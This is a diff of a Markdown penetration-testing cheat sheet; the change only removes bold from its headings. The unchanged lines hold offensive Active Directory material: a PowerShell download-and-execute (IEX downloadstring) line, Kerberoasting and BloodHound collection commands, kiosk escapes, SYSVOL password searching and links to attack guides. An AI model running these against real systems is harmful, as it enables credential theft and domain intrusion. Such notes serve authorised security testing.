@@ -8,37 +8,37 @@ IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/
 
 # CYBER CHEAT SHEET
 
-**Global Ressources**
+Global Ressources
 ---
 - https://viperone.gitbook.io/pentest-everything
 - https://book.hacktricks.xyz/
 - https://atomicredteam.io/atomics/
 - https://github.com/S3cur3Th1sSh1t/
 
-**Kiosk evasion** : file access from browser or openfile dialogbox
+Kiosk evasion : file access from browser or openfile dialogbox
 ---
 ```
 file://c:/windows/system32/calc.exe
 ```
 
-**Recent user activity**
+Recent user activity
 ---
 ```
 C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
 ```
 
-**Url file attack**
+Url file attack
 ---
 - https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
 - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack
 - https://github.com/mdsecactivebreach/Farmer
 - https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
 
-**NTLM**
+NTLM
 ---
 - https://www.scip.ch/en/?labs.20210909
 
-**KALI : Files Transfert**
+KALI : Files Transfert
 ---
 ```
 python -m http.server
@@ -47,17 +47,17 @@ python -m http.server
 - https://haveibeenpwned.com/
 - https://breachdirectory.org/
 
-**SYSVOL access without serveur name**
+SYSVOL access without serveur name
 ---
 ```
 \\mon-domaine.fr\sysvol
 ```
-**Searching Password in GPO with explorer**
+Searching Password in GPO with explorer
 ---
 
 ![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)
 
-**BloodHound**
+BloodHound
 ---
 ```
 bloodhound-python -d domain -u username@domain -p password -c all -ns domain_controller_ip -v
@@ -69,7 +69,7 @@ bloodhound
 ```
 https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f
 
-**ADMiner**
+ADMiner
 ---
 ```
 pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
@@ -78,7 +78,7 @@ AD-miner -c -cf My_Report -u neo4j -p mypassword
 ```
 https://github.com/Mazars-Tech/AD_Miner
 
-**Kerberoasting**
+Kerberoasting
 ---
 ```
 Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hashcat
@@ -87,7 +87,7 @@ Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hash
 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
 - https://www.youtube.com/watch?v=ycNadGeq03E
   
-**MEMCM - MDT - PXE**
+MEMCM - MDT - PXE
 ---
 
 - https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments
